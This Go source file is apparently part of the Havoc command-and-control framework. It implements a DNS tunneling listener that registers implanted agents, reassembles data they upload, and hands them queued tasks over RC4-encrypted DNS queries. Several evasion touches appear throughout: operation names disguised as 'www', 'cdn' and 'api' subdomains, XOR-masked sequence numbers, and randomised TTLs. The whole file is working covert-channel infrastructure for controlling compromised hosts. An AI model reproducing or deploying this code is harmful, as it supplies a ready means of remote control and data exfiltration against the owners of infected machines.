package handlers

import (
	crand "crypto/rand"
	"crypto/rc4"
	"encoding/base32"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"math/rand"
	"net"
	"regexp"
	"slices"
	"strconv"
	"strings"
	"sync"
	"time"

	"Havoc/pkg/agent"
	"Havoc/pkg/colors"
	"Havoc/pkg/logger"

	"github.com/miekg/dns"
)

const (
	DNSDefaultBindHost = "0.0.0.0"
	DNSDefaultBindPort = 53
	DNSDefaultPktSize  = 512
	DNSDefaultTTL      = 10
	DNSDefaultKey      = "000102030405060708090a0b0c0d0e0f"

	// DNSMaxUpload bounds a single reassembled upload. The agent splits
	// larger messages into fragments and the server never allocates more
	// than this for one session.
	DNSMaxUpload = 4 << 20

	// dnsSafeChunkSize is the largest raw payload that is safe to return in
	// a single UDP DNS answer.
	dnsSafeChunkSize = 220

	// seqXorMask is applied to the sequence number before it is written as
	// hex into the QNAME. The agent uses the same mask.
	seqXorMask = 0x5A5A5A5A

	dnsCleanupInterval = 60 * time.Second
	dnsStaleTimeout    = 5 * time.Minute
	dnsDownTimeout     = 10 * time.Minute
	dnsDedupTimeout    = 5 * time.Minute
)

// DNSConfig is the DNS listener transport configuration. The wire-relevant
// fields mirror AdaptixC2's TransportConfig; the remaining fields keep the
// Havoc listener metadata the rest of the teamserver expects.
type DNSConfig struct {
	// AdaptixC2-compatible transport configuration.
	HostBind     string `json:"host_bind"`
	PortBind     int    `json:"port_bind"`
	Domain       string `json:"domain"`
	PktSize      int    `json:"pkt_size"`
	TTL          int    `json:"ttl"`
	EncryptKey   string `json:"encrypt_key"`
	BurstEnabled bool   `json:"burst_enabled"`
	BurstSleep   int    `json:"burst_sleep"`
	BurstJitter  int    `json:"burst_jitter"`
	Resolvers    string `json:"resolvers"`
	DohResolvers string `json:"doh_resolvers"`

	// Domains is the canonical domain suffix list used by parseRequest.
	// It is derived from Domain and is never sent to the agent.
	Domains []string `json:"-"`

	// Havoc listener metadata and client-facing compatibility fields.
	Name         string `json:"name"`
	KillDate     int64  `json:"kill_date"`
	WorkingHours string `json:"working_hours"`

	// Legacy names kept so existing profiles and clients keep working.
	BindHost   string `json:"bind_host,omitempty"`
	BindPort   int    `json:"bind_port,omitempty"`
	RecordType string `json:"record_type,omitempty"`
	Encoding   string `json:"encoding,omitempty"`
	Frequency  int    `json:"frequency,omitempty"`
}

// TransportDNS implements the AdaptixC2-compatible DNS transport.
type TransportDNS struct {
	Config DNSConfig

	Teamserver agent.TeamServer
	Active     bool

	udpServer *dns.Server
	tcpServer *dns.Server

	mu          sync.Mutex
	upFrags     map[string]*dnsFragBuf
	downFrags   map[string]*dnsDownBuf
	upDoneCache map[string]*dnsUpDone
	needsReset  map[string]bool
	rng         *rand.Rand
	quit        chan struct{}
	stopOnce    sync.Once
}

type dnsFragBuf struct {
	total           uint32
	buf             []byte
	filled          uint32
	highWater       uint32
	expectedOff     uint32
	lastUpdate      time.Time
	seenOffsets     map[uint32]bool
	lastReceivedOff uint32
	nextExpectedOff uint32
	chunkSize       uint32
}

type dnsDownBuf struct {
	total      uint32
	off        uint32
	buf        []byte
	taskNonce  uint32
	lastUpdate time.Time
}

type dnsUpDone struct {
	total  uint32
	doneAt time.Time
}

type dnsRequest struct {
	sid   string
	op    string
	seq   int
	data  []byte
	qtype uint16
	qname string
}

type putAckInfo struct {
	lastReceivedOff uint32
	nextExpectedOff uint32
	total           uint32
	filled          uint32
	needsReset      bool
	complete        bool
}

func NewConfigDns() *DNS {
	return &DNS{TransportDNS: &TransportDNS{}}
}

func newFragBuf(total uint32) *dnsFragBuf {
	return &dnsFragBuf{
		total:       total,
		buf:         make([]byte, total),
		lastUpdate:  time.Now(),
		seenOffsets: make(map[uint32]bool),
	}
}

func newDownBuf(data []byte, nonce uint32) *dnsDownBuf {
	return &dnsDownBuf{
		total:      uint32(len(data)),
		buf:        data,
		taskNonce:  nonce,
		lastUpdate: time.Now(),
	}
}

func (d *DNS) Start() error {
	if d.TransportDNS == nil {
		d.TransportDNS = &TransportDNS{}
	}
	d.TransportDNS.Teamserver = d.Teamserver

	if err := d.TransportDNS.Start(); err != nil {
		return err
	}

	addr := net.JoinHostPort(d.Config.HostBind, strconv.Itoa(d.Config.PortBind))
	logger.Info("Started \"" + colors.Green(d.Config.Name) + "\" listener: " + colors.BlueUnderline("dns://"+addr+"#"+d.Config.Domain))

	// Add listener to teamserver.
	pk := d.Teamserver.ListenerAdd("", LISTENER_DNS, d)
	d.Teamserver.EventAppend(pk)
	d.Teamserver.EventBroadcast("", pk)

	return nil
}

func (d *DNS) Stop() error {
	if d.TransportDNS == nil {
		return nil
	}
	return d.TransportDNS.Stop()
}

// normalizeDNSDomain returns the canonical lower-case domain without a
// trailing dot.
func normalizeDNSDomain(domain string) (string, error) {
	domain = strings.TrimSpace(strings.ToLower(domain))
	domain = strings.TrimSuffix(domain, ".")
	if domain == "" {
		return "", fmt.Errorf("dns domain is empty")
	}

	if len(domain) > 253 {
		return "", fmt.Errorf("dns domain is too long: %s", domain)
	}
	for _, label := range strings.Split(domain, ".") {
		if label == "" || len(label) > 63 {
			return "", fmt.Errorf("invalid dns label in domain: %s", domain)
		}
		for _, c := range label {
			if !((c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') || c == '-' || c == '_') {
				return "", fmt.Errorf("invalid character %q in dns domain: %s", c, domain)
			}
		}
	}

	return domain, nil
}

// NormalizeDNSConfig applies the default values of a DNS listener
// configuration and validates the result. The listener and the payload
// builder share it so that the teamserver and the agent always use the same
// effective configuration.
func NormalizeDNSConfig(config DNSConfig) (DNSConfig, error) {
	domain, err := normalizeDNSDomain(config.Domain)
	if err != nil {
		return config, err
	}
	config.Domain = domain
	config.Domains = []string{domain}

	// Keep the legacy Havoc field names in sync with the wire fields.
	if config.HostBind == "" {
		config.HostBind = config.BindHost
	}
	if config.HostBind == "" {
		config.HostBind = DNSDefaultBindHost
	}
	config.BindHost = config.HostBind

	if config.PortBind == 0 {
		config.PortBind = config.BindPort
	}
	if config.PortBind == 0 {
		config.PortBind = DNSDefaultBindPort
	}
	if config.PortBind < 1 || config.PortBind > 65535 {
		return config, fmt.Errorf("invalid dns bind port: %d", config.PortBind)
	}
	config.BindPort = config.PortBind

	if config.PktSize <= 0 {
		config.PktSize = DNSDefaultPktSize
	}
	if config.TTL <= 0 {
		config.TTL = DNSDefaultTTL
	}
	if config.EncryptKey == "" {
		// A listener without an explicit key gets its own random key. The
		// key is part of the listener configuration and is therefore
		// persisted with the listener.
		key, err := generateDNSKey()
		if err != nil {
			return config, err
		}
		config.EncryptKey = key
	}
	if _, err := rc4Key(config.EncryptKey); err != nil {
		return config, err
	}
	if config.Frequency <= 0 {
		config.Frequency = 30
	}
	if config.BurstSleep <= 0 {
		config.BurstSleep = 50
	}
	if config.BurstJitter < 0 {
		config.BurstJitter = 0
	}
	if config.BurstJitter > 90 {
		config.BurstJitter = 90
	}
	if config.RecordType == "" {
		config.RecordType = "TXT"
	}
	if config.Encoding == "" {
		config.Encoding = "base32"
	}

	return config, nil
}

// generateDNSKey returns a random 16 byte key in its hex representation.
func generateDNSKey() (string, error) {
	key := make([]byte, 16)

	if _, err := crand.Read(key); err != nil {
		return "", fmt.Errorf("failed to generate the dns encryption key: %w", err)
	}

	return hex.EncodeToString(key), nil
}

func (t *TransportDNS) normalizeConfig() error {
	config, err := NormalizeDNSConfig(t.Config)
	if err != nil {
		return err
	}

	t.Config = config

	return nil
}

// Start binds UDP and TCP synchronously so a bind failure is reported to
// ListenerStart instead of leaving a listener registered but not listening.
func (t *TransportDNS) Start() error {
	logger.Debug("Setup DNS Server")

	if err := t.normalizeConfig(); err != nil {
		return err
	}

	logger.Debug("DNS listener \"" + t.Config.Name + "\" uses the RC4 key " + t.Config.EncryptKey)

	if t.quit == nil {
		t.quit = make(chan struct{})
	}
	if t.upFrags == nil {
		t.upFrags = make(map[string]*dnsFragBuf)
	}
	if t.downFrags == nil {
		t.downFrags = make(map[string]*dnsDownBuf)
	}
	if t.upDoneCache == nil {
		t.upDoneCache = make(map[string]*dnsUpDone)
	}
	if t.needsReset == nil {
		t.needsReset = make(map[string]bool)
	}
	if t.rng == nil {
		t.rng = rand.New(rand.NewSource(time.Now().UnixNano()))
	}

	addr := net.JoinHostPort(t.Config.HostBind, strconv.Itoa(t.Config.PortBind))

	udpConn, err := net.ListenPacket("udp", addr)
	if err != nil {
		return fmt.Errorf("failed to bind dns udp %s: %w", addr, err)
	}

	tcpListener, err := net.Listen("tcp", addr)
	if err != nil {
		_ = udpConn.Close()
		return fmt.Errorf("failed to bind dns tcp %s: %w", addr, err)
	}

	mux := dns.NewServeMux()
	mux.HandleFunc(".", t.handleDNS)

	t.udpServer = &dns.Server{PacketConn: udpConn, Handler: mux}
	t.tcpServer = &dns.Server{Listener: tcpListener, Handler: mux}
	t.Active = true

	go t.cleanupLoop()

	go func() {
		if err := t.udpServer.ActivateAndServe(); err != nil {
			t.Active = false
			logger.Error("DNS UDP server stopped: " + err.Error())
		}
	}()

	go func() {
		if err := t.tcpServer.ActivateAndServe(); err != nil {
			t.Active = false
			logger.Error("DNS TCP server stopped: " + err.Error())
		}
	}()

	return nil
}

// Stop gracefully shuts down both DNS transports.
func (t *TransportDNS) Stop() error {
	if t.quit != nil {
		t.stopOnce.Do(func() {
			close(t.quit)
		})
	}

	var firstErr error
	for _, server := range []*dns.Server{t.udpServer, t.tcpServer} {
		if server == nil {
			continue
		}
		if err := server.Shutdown(); err != nil && !strings.Contains(err.Error(), "server not started") {
			if firstErr == nil {
				firstErr = err
			}
		}
	}

	t.Active = false
	return firstErr
}

func (t *TransportDNS) cleanupLoop() {
	ticker := time.NewTicker(dnsCleanupInterval)
	defer ticker.Stop()

	for {
		select {
		case <-t.quit:
			return
		case now := <-ticker.C:
			t.cleanupStale(now)
		}
	}
}

func (t *TransportDNS) cleanupStale(now time.Time) {
	t.mu.Lock()
	defer t.mu.Unlock()

	for sid, fb := range t.upFrags {
		if now.Sub(fb.lastUpdate) > dnsStaleTimeout {
			delete(t.upFrags, sid)
		}
	}
	for sid, db := range t.downFrags {
		if now.Sub(db.lastUpdate) > dnsDownTimeout {
			delete(t.downFrags, sid)
		}
	}
	for sid, done := range t.upDoneCache {
		if now.Sub(done.doneAt) > dnsDedupTimeout {
			delete(t.upDoneCache, sid)
		}
	}
}

// handleDNS processes one DNS question. HI/PUT/GET/HB map onto the same
// label order used by AdaptixC2:
//
//	{SID}.{OP}.{SEQ}.{IDX}.{DATA_LABELS}.{DOMAIN}
func (t *TransportDNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
	msg := new(dns.Msg)
	msg.SetReply(r)
	msg.Authoritative = true

	ttl := uint32(t.Config.TTL)
	if ttl == 0 {
		ttl = DNSDefaultTTL
	}
	ttl += uint32(rand.Intn(60))

	// Only one question is expected per query, the first one is answered.
	if len(r.Question) > 0 {
		req := t.parseRequest(r.Question[0])

		switch req.op {
		case "HI":
			if len(req.data) > 0 {
				t.handleHI(req, w)
			}
			msg.Answer = append(msg.Answer, t.buildAckResponse(req, ttl))

		case "PUT":
			var ack putAckInfo
			if len(req.data) > 0 {
				ack = t.handlePUT(req)
			}
			msg.Answer = append(msg.Answer, t.buildPutAckResponse(req, ack, ttl))

		case "GET":
			frame := t.handleGET(req, w)
			msg.Answer = append(msg.Answer, t.buildDataResponse(req, frame, ttl))

		case "HB":
			needsReset, hasPending := t.handleHB(req)
			msg.Answer = append(msg.Answer, t.buildHBResponse(req, needsReset, hasPending, ttl))

		default:
			msg.Answer = append(msg.Answer, t.buildAckResponse(req, ttl))
			/* The handler was answering to any DNS query with: TXT "OK", making the windows resolvers FAIL
			msg.Answer = append(msg.Answer, &dns.TXT{
				Hdr: dns.RR_Header{Name: req.qname, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl},
				Txt: []string{"OK"},
			})
			*/
		}
	}

	// A UDP answer larger than the client's buffer must set TC so the client
	// retries over TCP. The TCP handler runs the same code path.
	if w.LocalAddr() != nil && w.LocalAddr().Network() == "udp" {
		size := dns.MinMsgSize
		if opt := r.IsEdns0(); opt != nil && int(opt.UDPSize()) > size {
			size = int(opt.UDPSize())
		}
		msg.Truncate(size)
	}

	if err := w.WriteMsg(msg); err != nil {
		logger.Debug("failed to write dns response: " + err.Error())
	}
}

func (t *TransportDNS) domains() []string {
	if len(t.Config.Domains) > 0 {
		return t.Config.Domains
	}
	if t.Config.Domain == "" {
		return nil
	}
	domain := strings.TrimSuffix(strings.ToLower(t.Config.Domain), ".")
	if domain == "" {
		return nil
	}
	return []string{domain}
}

func (t *TransportDNS) parseRequest(q dns.Question) *dnsRequest {
	labels := dns.SplitDomainName(q.Name)
	base := labels

	// Strip the configured domain suffix, if any.
	if domains := t.domains(); len(domains) > 0 {
		for i := range labels {
			tail := strings.ToLower(strings.Join(labels[i:], "."))

			if slices.Contains(domains, tail) {
				base = labels[:i]
				break
			}
		}
	}

	req := new(dnsRequest)
	req.qtype = q.Qtype
	req.qname = q.Name

	if len(base) < 5 {
		return req
	}

	req.sid = strings.ToLower(base[0])
	rawOp := strings.ToLower(base[1])

	switch rawOp {
	case "www", "hi":
		req.op = "HI"
	case "cdn", "put":
		req.op = "PUT"
	case "api", "get":
		req.op = "GET"
	case "hb":
		req.op = "HB"
	}

	if v, err := strconv.ParseUint(base[2], 16, 32); err == nil {
		req.seq = int(v ^ seqXorMask)
	}

	dataLabel := strings.ToUpper(strings.Join(base[4:], ""))
	enc := base32.StdEncoding.WithPadding(base32.NoPadding)
	if db, err := enc.DecodeString(dataLabel); err == nil {
		req.data = db
	}

	if match, _ := regexp.MatchString("^[0-9a-fA-F]{8}$", req.sid); !match {
		req.op = ""
	}

	maxPayload := t.Config.PktSize * 4
	if maxPayload <= 0 {
		maxPayload = DNSDefaultPktSize * 4
	}
	if len(req.data) > maxPayload {
		req.data = nil
	}

	return req
}

func (t *TransportDNS) handleHI(req *dnsRequest, w dns.ResponseWriter) {
	if len(req.data) < 8 {
		return
	}

	fullBeat := t.crypt(req.data)
	if len(fullBeat) < 8 {
		return
	}

	// Havoc's registration packet starts with [size][magic][agent id].
	if isHavocPackage(fullBeat) {
		t.processHIBeat(req.sid, fullBeat, remoteIP(w))
		return
	}

	// A framed HI message carries [total][offset][chunk] so a registration
	// packet that does not fit into a single query can be split over
	// several queries.
	if total, offset, chunk, ok := parseDNSFrame(fullBeat); ok {
		complete, _, _, assembled := t.addFragment(req.sid+":hi", total, offset, chunk)
		if complete && assembled != nil {
			t.processHIBeat(req.sid, assembled, remoteIP(w))
		}
		return
	}

	t.processHIBeat(req.sid, fullBeat, remoteIP(w))
}

// processHIBeat registers the agent from a decrypted HI payload.
//
// Two layouts are supported:
//   - Havoc's native packet, which starts with [size][magic][agent id].
//   - AdaptixC2's beat, whose first 8 bytes carry the agent type and id and
//     whose remainder carries the agent metadata.
func (t *TransportDNS) processHIBeat(sid string, beat []byte, externalIP string) {
	if len(beat) == 0 {
		return
	}

	if isHavocPackage(beat) {
		response := t.processAgentData(sid, beat, externalIP)
		t.storeResponse(sid, response)
		t.touchAgent(sid)
		return
	}

	if len(beat) > 8 {
		agentType := binary.BigEndian.Uint32(beat[0:4])
		agentID := binary.BigEndian.Uint32(beat[4:8])
		logger.Debug(fmt.Sprintf("DNS HI: agent type %08x id %08x", agentType, agentID))

		if rest := beat[8:]; isHavocPackage(rest) {
			response := t.processAgentData(sid, rest, externalIP)
			t.storeResponse(sid, response)
		}
	}

	t.touchAgent(sid)
}

// parseDNSFrame splits a fragment frame into its total length, the offset of
// the carried chunk and the chunk itself.
//
// The layout is fixed by the protocol: [0:4] total (big endian),
// [4:8] offset (big endian), [8:] chunk.
func parseDNSFrame(data []byte) (uint32, uint32, []byte, bool) {
	if len(data) < 9 {
		return 0, 0, nil, false
	}

	total := binary.BigEndian.Uint32(data[0:4])
	offset := binary.BigEndian.Uint32(data[4:8])
	chunk := data[8:]

	if total == 0 || total > DNSMaxUpload {
		return 0, 0, nil, false
	}
	if offset > total {
		return 0, 0, nil, false
	}
	if uint32(len(chunk)) > total {
		return 0, 0, nil, false
	}

	return total, offset, chunk, true
}

// addFragment stores one fragment frame in the reassembly buffer identified
// by key. It returns the reassembly state and, once the message is complete,
// the assembled payload.
func (t *TransportDNS) addFragment(key string, total uint32, offset uint32, chunk []byte) (bool, uint32, uint32, []byte) {
	t.mu.Lock()
	defer t.mu.Unlock()

	if t.upFrags == nil {
		t.upFrags = make(map[string]*dnsFragBuf)
	}
	if t.upDoneCache == nil {
		t.upDoneCache = make(map[string]*dnsUpDone)
	}

	if done, exists := t.upDoneCache[key]; exists && done.total == total {
		return true, done.total, done.total, nil
	}

	fb, ok := t.upFrags[key]
	if !ok || fb.total != total || (offset == 0 && fb.highWater > 0) {
		fb = newFragBuf(total)
		t.upFrags[key] = fb
	}

	chunkLen := uint32(len(chunk))
	if fb.chunkSize == 0 && chunkLen > 0 {
		fb.chunkSize = chunkLen
	}

	if offset >= fb.total || fb.seenOffsets[offset] {
		return false, t.computeNextExpectedOffset(fb), fb.filled, nil
	}

	end := min(offset+chunkLen, fb.total)
	n := end - offset
	copy(fb.buf[offset:end], chunk[:n])

	fb.seenOffsets[offset] = true
	fb.filled += n
	fb.lastReceivedOff = offset
	fb.expectedOff = end
	fb.lastUpdate = time.Now()
	if end > fb.highWater {
		fb.highWater = end
	}
	fb.nextExpectedOff = t.computeNextExpectedOffset(fb)

	if fb.filled >= fb.total {
		assembled := make([]byte, len(fb.buf))
		copy(assembled, fb.buf)
		t.upDoneCache[key] = &dnsUpDone{total: fb.total, doneAt: time.Now()}
		delete(t.upFrags, key)
		return true, fb.total, fb.filled, assembled
	}

	return false, fb.nextExpectedOff, fb.filled, nil
}

func (t *TransportDNS) handlePUT(req *dnsRequest) putAckInfo {
	ack := putAckInfo{}

	if len(req.data) == 0 {
		return ack
	}

	t.mu.Lock()
	if t.needsReset[req.sid] {
		ack.needsReset = true
		delete(t.needsReset, req.sid)
	}
	t.mu.Unlock()

	decrypted := t.crypt(req.data)
	ack = t.handlePutFragment(req.sid, decrypted, ack)

	t.touchAgent(req.sid)
	return ack
}

func (t *TransportDNS) handlePutFragment(sid string, data []byte, ack putAckInfo) putAckInfo {
	if sid == "" {
		return ack
	}

	// A message that is not a fragment frame is processed as-is. This keeps
	// the transport usable for small single-packet messages and for clients
	// that only implement the original AdaptixC2 path.
	if len(data) <= 8 {
		response := t.processAgentData(sid, data, "")
		t.storeResponse(sid, response)
		return ack
	}

	total, offset, chunk, ok := parseDNSFrame(data)
	if !ok {
		response := t.processAgentData(sid, data, "")
		t.storeResponse(sid, response)
		return ack
	}

	ack.total = total

	if offset == 0 && total <= uint32(len(chunk)) {
		payload := chunk[:total]
		ack.complete = true
		ack.filled = total
		ack.lastReceivedOff = 0
		ack.nextExpectedOff = total
		response := t.processAgentData(sid, payload, "")
		t.storeResponse(sid, response)
		return ack
	}

	complete, nextExpected, filled, assembled := t.addFragment(sid, total, offset, chunk)

	ack.complete = complete
	ack.nextExpectedOff = nextExpected
	ack.filled = filled
	ack.lastReceivedOff = offset

	if assembled != nil {
		response := t.processAgentData(sid, assembled, "")
		t.storeResponse(sid, response)
	}

	return ack
}

func (t *TransportDNS) computeNextExpectedOffset(fb *dnsFragBuf) uint32 {
	if fb.chunkSize == 0 {
		return fb.highWater
	}
	for off := uint32(0); off < fb.total; off += fb.chunkSize {
		if !fb.seenOffsets[off] {
			return off
		}
	}
	return fb.total
}

func (t *TransportDNS) handleGET(req *dnsRequest, w dns.ResponseWriter) []byte {
	decrypted := t.crypt(req.data)

	var reqOffset uint32
	if len(decrypted) >= 4 {
		reqOffset = binary.BigEndian.Uint32(decrypted[0:4])
	}

	t.mu.Lock()
	df, exists := t.downFrags[req.sid]
	if exists && df != nil {
		df.lastUpdate = time.Now()
		if reqOffset > 0 && reqOffset <= df.total && reqOffset > df.off {
			df.off = reqOffset
		}
	}
	t.mu.Unlock()

	if df == nil || df.off >= df.total {
		if df != nil && df.off >= df.total {
			t.mu.Lock()
			delete(t.downFrags, req.sid)
			t.mu.Unlock()
		}
		df = t.fetchTasks(req.sid)
		if df != nil {
			t.mu.Lock()
			if t.downFrags == nil {
				t.downFrags = make(map[string]*dnsDownBuf)
			}
			t.downFrags[req.sid] = df
			t.mu.Unlock()
		}
	}

	t.touchAgent(req.sid)

	isTCP := w.RemoteAddr() != nil && w.RemoteAddr().Network() == "tcp"

	t.mu.Lock()
	defer t.mu.Unlock()
	return t.buildResponseChunk(df, reqOffset, isTCP)
}

func (t *TransportDNS) handleHB(req *dnsRequest) (needsReset bool, hasPendingTasks bool) {
	t.touchAgent(req.sid)

	t.mu.Lock()
	if t.needsReset[req.sid] {
		needsReset = true
		delete(t.needsReset, req.sid)
	}
	t.mu.Unlock()

	decrypted := t.crypt(req.data)
	var ackOffset uint32
	if len(decrypted) >= 4 {
		ackOffset = binary.BigEndian.Uint32(decrypted[0:4])
	}

	t.mu.Lock()
	df, hasDf := t.downFrags[req.sid]
	if hasDf && df != nil {
		df.lastUpdate = time.Now()
		if df.total > 0 && ackOffset >= df.total {
			delete(t.downFrags, req.sid)
			df = nil
			hasDf = false
		}
	}
	t.mu.Unlock()

	if !hasDf || df == nil {
		df = t.fetchTasks(req.sid)
		if df != nil {
			t.mu.Lock()
			if t.downFrags == nil {
				t.downFrags = make(map[string]*dnsDownBuf)
			}
			t.downFrags[req.sid] = df
			t.mu.Unlock()
			hasPendingTasks = true
		}
	} else {
		hasPendingTasks = true
	}

	return needsReset, hasPendingTasks
}

func (t *TransportDNS) buildResponseChunk(df *dnsDownBuf, reqOffset uint32, isTCP bool) []byte {
	if df == nil || df.total == 0 {
		return nil
	}

	if reqOffset >= df.total {
		reqOffset = 0
	}

	maxChunk := t.Config.PktSize
	if !isTCP {
		if maxChunk <= 0 || maxChunk > dnsSafeChunkSize {
			maxChunk = dnsSafeChunkSize
		}
	} else if maxChunk <= 0 {
		maxChunk = DNSDefaultPktSize
	}

	remaining := df.total - reqOffset
	chunkLen := min(remaining, uint32(maxChunk))

	frame := make([]byte, 8+chunkLen)
	binary.BigEndian.PutUint32(frame[0:4], df.total)
	binary.BigEndian.PutUint32(frame[4:8], reqOffset)
	copy(frame[8:], df.buf[reqOffset:reqOffset+chunkLen])
	return frame
}

func (t *TransportDNS) buildAckResponse(req *dnsRequest, ttl uint32) dns.RR {
	switch req.qtype {
	case dns.TypeA:
		return &dns.A{
			Hdr: dns.RR_Header{Name: req.qname, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl},
			A:   net.ParseIP("127.0.0.1").To4(),
		}
	case dns.TypeAAAA:
		return &dns.AAAA{
			Hdr:  dns.RR_Header{Name: req.qname, Rrtype: dns.TypeAAAA, Class: dns.ClassINET, Ttl: ttl},
			AAAA: net.ParseIP("::1").To16(),
		}
	default:
		return &dns.TXT{
			Hdr: dns.RR_Header{Name: req.qname, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl},
			Txt: []string{"OK"},
		}
	}
}

func (t *TransportDNS) buildPutAckResponse(req *dnsRequest, ack putAckInfo, ttl uint32) dns.RR {
	switch req.qtype {
	case dns.TypeA:
		ip := make(net.IP, 4)
		var flags byte
		if ack.complete {
			flags |= 0x01
		}
		if ack.needsReset {
			flags |= 0x02
		}
		ip[0] = flags
		ip[1] = byte((ack.nextExpectedOff >> 16) & 0xFF)
		ip[2] = byte((ack.nextExpectedOff >> 8) & 0xFF)
		ip[3] = byte(ack.nextExpectedOff & 0xFF)
		return &dns.A{
			Hdr: dns.RR_Header{Name: req.qname, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl},
			A:   ip,
		}
	case dns.TypeAAAA:
		ip := make(net.IP, 16)
		var flags byte
		if ack.complete {
			flags |= 0x01
		}
		if ack.needsReset {
			flags |= 0x02
		}
		ip[0] = flags
		ip[1] = byte((ack.nextExpectedOff >> 24) & 0xFF)
		ip[2] = byte((ack.nextExpectedOff >> 16) & 0xFF)
		ip[3] = byte((ack.nextExpectedOff >> 8) & 0xFF)
		ip[4] = byte(ack.nextExpectedOff & 0xFF)
		ip[5] = byte((ack.filled >> 24) & 0xFF)
		ip[6] = byte((ack.filled >> 16) & 0xFF)
		ip[7] = byte((ack.filled >> 8) & 0xFF)
		ip[8] = byte(ack.filled & 0xFF)
		return &dns.AAAA{
			Hdr:  dns.RR_Header{Name: req.qname, Rrtype: dns.TypeAAAA, Class: dns.ClassINET, Ttl: ttl},
			AAAA: ip,
		}
	default:
		return &dns.TXT{
			Hdr: dns.RR_Header{Name: req.qname, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl},
			Txt: []string{"OK"},
		}
	}
}

func (t *TransportDNS) buildHBResponse(req *dnsRequest, needsReset bool, hasPendingTasks bool, ttl uint32) dns.RR {
	switch req.qtype {
	case dns.TypeA:
		ip := make(net.IP, 4)
		var flags byte
		if hasPendingTasks {
			flags |= 0x01
		}
		if needsReset {
			flags |= 0x02
		}
		ip[0] = flags
		return &dns.A{
			Hdr: dns.RR_Header{Name: req.qname, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl},
			A:   ip,
		}
	case dns.TypeAAAA:
		ip := make(net.IP, 16)
		var flags byte
		if hasPendingTasks {
			flags |= 0x01
		}
		if needsReset {
			flags |= 0x02
		}
		ip[0] = flags
		return &dns.AAAA{
			Hdr:  dns.RR_Header{Name: req.qname, Rrtype: dns.TypeAAAA, Class: dns.ClassINET, Ttl: ttl},
			AAAA: ip,
		}
	default:
		return &dns.TXT{
			Hdr: dns.RR_Header{Name: req.qname, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl},
			Txt: []string{"OK"},
		}
	}
}

func (t *TransportDNS) buildDataResponse(req *dnsRequest, frame []byte, ttl uint32) dns.RR {
	if len(frame) == 0 {
		return &dns.TXT{
			Hdr: dns.RR_Header{Name: req.qname, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl},
			Txt: []string{""},
		}
	}

	encrypted := t.crypt(frame)
	b64 := base64.StdEncoding.EncodeToString(encrypted)

	var chunks []string
	for len(b64) > 255 {
		chunks = append(chunks, b64[:255])
		b64 = b64[255:]
	}
	chunks = append(chunks, b64)

	return &dns.TXT{
		Hdr: dns.RR_Header{Name: req.qname, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl},
		Txt: chunks,
	}
}

// fetchTasks is Havoc's equivalent of AdaptixC2's TsAgentGetHostedAll: it
// asks the normal request parser for the agent's queued jobs by sending a
// synthetic DEMON_COMMAND_GET_JOB package for that agent.
func (t *TransportDNS) fetchTasks(sid string) *dnsDownBuf {
	if t.Teamserver == nil {
		return nil
	}

	id, err := strconv.ParseUint(sid, 16, 32)
	if err != nil || !t.Teamserver.AgentExist(int(id)) {
		return nil
	}

	// Agent packages are big endian: [size][magic][agent id][command][request id].
	pkg := make([]byte, 20)
	binary.BigEndian.PutUint32(pkg[0:4], uint32(len(pkg)-4))
	binary.BigEndian.PutUint32(pkg[4:8], uint32(agent.DEMON_MAGIC_VALUE))
	binary.BigEndian.PutUint32(pkg[8:12], uint32(id))
	binary.BigEndian.PutUint32(pkg[12:16], uint32(agent.COMMAND_GET_JOB))
	binary.BigEndian.PutUint32(pkg[16:20], 0)

	response, ok := parseAgentRequest(t.Teamserver, pkg, "")
	if !ok || response.Len() == 0 {
		return nil
	}
	return newDownBuf(response.Bytes(), 0)
}

func (t *TransportDNS) processAgentData(sid string, data []byte, externalIP string) []byte {
	if t.Teamserver == nil || len(data) == 0 {
		return nil
	}
	response, ok := parseAgentRequest(t.Teamserver, data, externalIP)
	if !ok {
		logger.Warn("Failed to parse agent request of session " + sid + " over DNS")
		return nil
	}
	return response.Bytes()
}

func (t *TransportDNS) storeResponse(sid string, response []byte) {
	if sid == "" || len(response) == 0 {
		return
	}
	t.mu.Lock()
	if t.downFrags == nil {
		t.downFrags = make(map[string]*dnsDownBuf)
	}
	t.downFrags[sid] = newDownBuf(response, 0)
	t.mu.Unlock()
}

func (t *TransportDNS) touchAgent(sid string) {
	if t.Teamserver == nil || sid == "" {
		return
	}
	id, err := strconv.ParseUint(sid, 16, 32)
	if err != nil {
		return
	}
	if instance := t.Teamserver.AgentInstance(int(id)); instance != nil {
		instance.UpdateLastCallback(t.Teamserver)
	}
}

func (t *TransportDNS) crypt(data []byte) []byte {
	if len(data) == 0 {
		return data
	}
	key, err := rc4Key(t.Config.EncryptKey)
	if err != nil {
		return data
	}
	cipher, err := rc4.NewCipher(key)
	if err != nil {
		return data
	}
	out := make([]byte, len(data))
	cipher.XORKeyStream(out, data)
	return out
}

func rc4Key(value string) ([]byte, error) {
	key, err := hex.DecodeString(strings.TrimSpace(value))
	if err == nil && len(key) == 16 {
		return key, nil
	}
	if len(value) == 16 {
		return []byte(value), nil
	}
	return nil, fmt.Errorf("dns encrypt_key must be a 16-byte hex string")
}

// DNSCryptKey returns the 16 byte RC4 key of a DNS listener configuration.
// The key is shared with the agent, so the same parsing rules apply on both
// sides of the wire.
func DNSCryptKey(value string) ([]byte, error) {
	return rc4Key(value)
}

func isHavocPackage(data []byte) bool {
	return len(data) >= 12 && binary.BigEndian.Uint32(data[4:8]) == uint32(agent.DEMON_MAGIC_VALUE)
}

func remoteIP(w dns.ResponseWriter) string {
	if w == nil || w.RemoteAddr() == nil {
		return ""
	}
	host, _, err := net.SplitHostPort(w.RemoteAddr().String())
	if err == nil {
		return host
	}
	return w.RemoteAddr().String()
}
